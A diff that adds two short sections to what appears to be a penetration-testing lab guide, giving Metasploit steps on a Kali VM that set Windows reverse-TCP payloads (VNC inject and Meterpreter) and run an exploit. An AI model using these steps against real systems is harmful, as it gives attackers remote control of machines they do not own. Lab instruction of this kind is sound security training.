@@ -90,3 +90,27 @@ exploit
 ```
 netstat -an
 ```
+
+## Using VNC Payload
+**On Kali VM**
+1. Try the exploit with the following payload:
+```
+set payload windows/vncinject/reverse_tcp
+```
+2. Type `show options` to see options set
+3. Run the exploit
+```
+exploit
+```
+
+## Using Meterpreter
+**On Kali VM**
+1. Try the exploit with the following payload:
+```
+set payload windows/meterpreter/reverse_tcp
+```
+2. Type  `show options` to see options set
+3. Run the exploit
+```
+exploit
+```
